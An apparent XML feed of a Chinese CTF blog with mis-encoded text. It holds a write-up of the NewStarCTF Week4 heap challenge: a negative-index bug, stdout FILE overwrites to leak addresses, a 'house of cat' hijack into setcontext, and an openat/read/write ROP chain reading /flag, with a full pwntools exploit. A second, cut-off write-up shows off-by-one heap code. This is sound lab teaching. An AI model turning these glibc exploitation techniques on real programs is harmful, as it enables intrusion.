    <link href="/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/"/>
    <url>/2022/11/02/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9BWeek4-pwn-%E8%BF%99%E6%98%AF%E5%A0%86/</url>
    
    <content type="html"><![CDATA[<p>é¢˜ç›®ç¯å¢ƒï¼šglibc-2.31</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>é¦–å…ˆçœ‹åˆ°é¢˜ç›®è°ƒç”¨äº†prctlå‡½æ•°ï¼Œè¯´æ˜å¼€äº†æ²™ç›’ä¿æŠ¤æœºåˆ¶ã€‚ä½¿ç”¨seccomp-toolsæ£€æŸ¥ä¸€ä¸‹</p><img src="/img/2/1667357666548.png" style="zoom: 80%;" /><p>å‘ç°é¢˜ç›®ç¦æ­¢äº†execveçš„ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°è¦ç”¨orwå°†flagè¯»å–å‡ºæ¥ï¼›ä½†è¿™é¢˜è¿˜æŠŠopenå‡½æ•°ç»™ç¦ç”¨äº†ï¼ˆæ˜¯ä¸æ˜¯å¾ˆæ— è¯­ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç³»ç»Ÿè°ƒç”¨openatå‡½æ•°å»æ‰“å¼€æ–‡ä»¶ï¼Œopenatå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º257ã€‚ </p><p>â€‹                                                                                                     </p><p>Addå‡½æ•°ç”³è¯·å †å—ï¼ŒDeleå‡½æ•°å’ŒShowå‡½æ•°å°±ä¸€å¥ç®€å•çš„putsè¾“å‡ºã€‚</p><p>å†å»çœ‹çœ‹Editå‡½æ•°ï¼Œå¯¹v1é‡‡ç”¨intç±»å‹å»å®šä¹‰çš„ï¼Œæ²¡æœ‰å¯¹è´Ÿæ•°è¿›è¡Œæ£€æŸ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å»ä¿®æ”¹é™¤å †ä»¥å¤–çš„å…¶å®ƒåœ°æ–¹ã€‚</p><p><img src="/img/2/1667357538953.png"></p><p>è¿›ä¸€æ­¥æŸ¥çœ‹è¿è¡Œæ—¶å…¨å±€å˜é‡heapsåœ¨bssæ®µçš„æ•°æ®ï¼Œå‘ç°å­˜åœ¨IO_FILEçš„åœ°å€ï¼Œå¯ä»¥è¾“å…¥è´Ÿæ•°ç„¶åç›´æ¥ä¿®æ”¹_IO_FILEå½“ä¸­çš„å€¼ã€‚</p><img src="/img/2/1667359698418.png" style="zoom: 80%;" /><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ç”±äºæ²¡æœ‰ä¸€ä¸ªå›ºå®šçš„åœ°å€å’Œå¯æ‰§è¡Œæ®µå»è®©æˆ‘ä»¬ä½¿ç”¨ï¼Œä½¿ç”¨shellcodeå»æ‰§è¡Œorwå°†flagè¯»å–å‡ºæ¥ï¼Œå¯¹äºè¿™é¢˜æ¥è¯´æ˜¯å¾ˆå›°éš¾çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ROPåŠ«æŒrspå¯„å­˜å™¨æ¥å®ç°orwã€‚</p><p>ç¨‹åºä¸­çš„gadgetè‚¯å®šæ˜¯ä¸å¤Ÿæˆ‘ä»¬å»å®ç°ROPçš„ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨libcä¸­çš„gadgetã€‚</p><p>è¦æ§åˆ¶rspæ‰å¯ä»¥å»ROPï¼Œlibcä¸­å¯ä»¥å»æ‰§è¡Œsetcontextä¸­çš„ä»£ç æ§åˆ¶rspï¼ˆå…·ä½“è§æˆ‘çš„Dest0g3 520è¿æ–°èµ› pwn ez_kiwiè¿™ç¯‡æ–‡ç« ï¼‰ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹_IO_FILEå½“ä¸­çš„å€¼ï¼Œå°±æƒ³åŠæ³•åŠ«æŒå…¶ä¸­çš„æ§åˆ¶æµï¼Œæ¥æ‰§è¡Œsetcontextã€‚</p><h3 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h3><h5 id="æ³„æ¼libc"><a href="#æ³„æ¼libc" class="headerlink" title="æ³„æ¼libc"></a>æ³„æ¼libc</h5><p>è¿™é‡Œæˆ‘ä»¬å°±å»ä¿®æ”¹æ ‡å‡†è¾“å‡º<code>_IO_2_1_stdout_</code>ä¸­çš„å€¼é¦–å…ˆæ³„æ¼libcçš„åŸºå€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨ROPgadget æ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œ<code>syscall ret</code>è¿™ä¸ªgeagetå¯ä»¥ä½¿ç”¨æ“ä½œç å»å¯»æ‰¾ï¼ˆå¦‚ä¸‹ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROPgadget <span class="hljs-attr">--binary</span> libc-<span class="hljs-number">2.31</span><span class="hljs-selector-class">.so</span> <span class="hljs-attr">--opcode</span> <span class="hljs-string">&quot;0f05c3&quot;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜è¦å¯»æ‰¾<code>0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>è¿™ä¸ªgadgetï¼Œå®ƒæ˜¯getkeyserv_handleå‡½æ•°å…¶ä¸­çš„ä¸€æ®µï¼Œä¸ºæˆ‘ä»¬åŠ«æŒæ§åˆ¶æµæä¾›äº†å¾ˆå¥½çš„å¸®åŠ©ï¼ˆæœ‰å¤§ä½¬ç§°ä¹‹ä¸º<strong>magic gadget</strong>ï¼‰ã€‚</p><h5 id="æ³„æ¼å †åœ°å€"><a href="#æ³„æ¼å †åœ°å€" class="headerlink" title="æ³„æ¼å †åœ°å€"></a>æ³„æ¼å †åœ°å€</h5><p>å­˜æ”¾gadgetï¼Œå †æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼Œåœ¨libcä¸­mpç»“æ„å°±å­˜æ”¾äº†å †åœ°å€ï¼Œæˆ‘ä»¬å°±é‡‡ç”¨ç›¸åŒçš„æ–¹å¼å»æ³„æ¼å †åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><h5 id="åŠ«æŒæ§åˆ¶æµ"><a href="#åŠ«æŒæ§åˆ¶æµ" class="headerlink" title="åŠ«æŒæ§åˆ¶æµ"></a>åŠ«æŒæ§åˆ¶æµ</h5><p>æ‰§è¡Œputså‡½æ•°ï¼Œä¼šé€šè¿‡æ‰¾åˆ°<code>_IO_2_1_stdout_</code>çš„<code>_IO_file_jumps</code>ä¸­çš„åç§»ï¼Œå»æ‰§è¡Œ<code>_IO_file_xsputn</code>å‡½æ•°ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¿®æ”¹<code>_IO_2_1_stdout_</code>çš„<code>_IO_file_jumps</code>ï¼Œ  è®©å…¶æœ€ç»ˆæ‰§è¡Œå…¶å®ƒå‡½æ•°ã€‚<code>_IO_file_jumps</code> å¹¶ä¸èƒ½æ”¹æˆä»»æ„åœ°å€ï¼Œåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­ä¼šå¯¹å…¶åœ°å€è¿›è¡Œæ£€æŸ¥ã€‚</p><p>è¿™é‡Œæˆ‘é‡‡ç”¨house of cat</p><p>è®©å…¶è°ƒç”¨<code>_IO_wfile_jumps</code>ä¸­çš„<code>_IO_wfile_seekoff</code>å‡½æ•°ï¼Œç„¶åè¿›å…¥åˆ°<code>_IO_switch_to_wget_mode</code>å‡½æ•°å»æ‰§è¡Œå¦‚ä¸‹ä»£ç ï¼ˆç®€å†™ï¼‰ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0xa0</span>]<br><span class="hljs-number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">15</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x20</span>]<br><span class="hljs-number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">37</span>&gt;    <span class="hljs-keyword">call</span>   <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]<br></code></pre></td></tr></table></figure><p>åŠ«æŒåˆ°_IO_wfile_jumpsï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="/img/2/1667369851498.png" style="zoom: 67%;" /><p>_IO_switch_to_wget_modeå‡½æ•°ä¸­å…·ä½“å®ç°ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="/img/2/1667370258241.png" style="zoom: 67%;" /><p>åœ¨è¿™è¿‡ç¨‹ä¸­rdiå¯„å­˜å™¨å§‹ç»ˆæ˜¯<code>_IO_2_1_stdout_</code>çš„åœ°å€ï¼Œ è®©å…¶æœ€åæ‰§è¡Œ<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>ã€‚</p><p>é€šè¿‡rdiçš„å€¼å»æ§åˆ¶rdxï¼Œå¹¶å»æ‰§è¡Œæˆ‘ä»¬æŒ‡å®šçš„å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯å»æ‰§è¡Œsetcontext åŠ«æŒrspå¯„å­˜å™¨æŒ‡å‘å †åœ°å€ã€‚</p><p>æ”¹å†™<code>_IO_2_1_stdout_</code>æ„é€ å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br></code></pre></td></tr></table></figure><h5 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h5><p>å†™å…¥å †ä¸­çš„æ•°æ®è¦æ³¨æ„setcontextçš„æ‰§è¡Œ ä¸orwä¸­gadgetçš„ä½ç½®ï¼Œå…·ä½“æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br></code></pre></td></tr></table></figure><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25381</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Any data?&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_wfile_jumps = libcbase + <span class="hljs-number">0x1e8de0</span><br>magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>ret = libcbase + <span class="hljs-number">0x22679</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br>setcontext = libcbase + <span class="hljs-number">347936</span><br>mp = libcbase + <span class="hljs-number">2015944</span><br><br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br>orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br>edit(<span class="hljs-number">0</span>, payload)<br><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">8</span>).encode())<br><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, fake_IO_FILE)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>å…³äºhouse of catæˆ‘æ²¡æœ‰è®²çš„å¤ªè¯¦ç»†ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒçœ‹é›ªå¤§ä½¬çš„æ–‡ç« <a href="https://bbs.pediy.com/thread-273895.htm">https://bbs.pediy.com/thread-273895.htm</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520è¿æ–°èµ› pwn ez_kiwi</title>
    <link href="/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/"/>
    <url>/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/</url>
    
    <content type="html"><![CDATA[<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>é¢˜ç›®ç¯å¢ƒï¼šglibc-2.31</p><p>å¦‚å›¾åœ¨editçš„è¿‡ç¨‹ä¸­å¯¹é‡æ–°è¾“å…¥çš„å­—ç¬¦é•¿åº¦æœªæœ‰æ•ˆæ£€æŸ¥ï¼Œé€ æˆå•å­—èŠ‚æº¢å‡ºã€‚</p><p><img src="/img/1/1.png"></p><p> è¿™æ—¶æˆ‘ä»¬å°±å¯åˆ©ç”¨è¿™ä¸€æ¼æ´è®©å †å—é‡å ï¼Œä»è€Œæ³„æ¼libcçš„åœ°å€</p><p>æ³„æ¼libcçš„åœ°å€é¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯unsorted binä¸­çš„main_arenaï¼Œç”±äºå­˜åœ¨tcacheï¼Œå¿…é¡»é‡Šæ”¾8ä¸ªå¤§å°ç›¸åŒæ‰ä¼šè¿›å…¥unsorted binï¼›åœ¨addçš„è¿‡ç¨‹ä¸­è¾“å…¥çš„idxå¯ä»¥å°äº0xfï¼Œä½†å®é™…ä¸Šè¶…è¿‡9å°±æ— æ³•æ­£å¸¸ç”³è¯·ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”³è¯·é‡Šæ”¾æ—¶è¦å°å¿ƒå †å—ä¸å¤Ÿå’Œtop chunkçš„åˆå¹¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):          <br> Â  Â add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#é‡å çš„å †å—</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#å…ˆé‡Šæ”¾è¿›å…¥tcacheï¼Œä¸ä¼štop chunkçš„åˆå¹¶</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br> Â  Â delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥å¾—åˆ°libcçš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - 